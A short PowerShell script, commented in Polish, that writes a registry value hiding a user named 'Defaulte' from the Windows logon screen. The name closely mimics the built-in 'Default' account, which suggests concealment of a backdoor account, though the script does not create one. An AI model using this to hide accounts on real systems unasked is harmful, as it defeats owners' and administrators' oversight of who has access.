$Path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
$User = "Defaulte"

# Sprawdź, czy ścieżka istnieje, jeśli nie, utwórz ją
if (-not (Test-Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts")) {
    New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" -Force
}

if (-not (Test-Path $Path)) {
    New-Item -Path $Path -Force
}

# Dodaj nową wartość DWORD, aby ukryć użytkownika
New-ItemProperty -Path $Path -Name $User -Value 0 -PropertyType DWORD -Force

Write-Output "Użytkownik 'Defaulte' został ukryty z ekranu logowania."
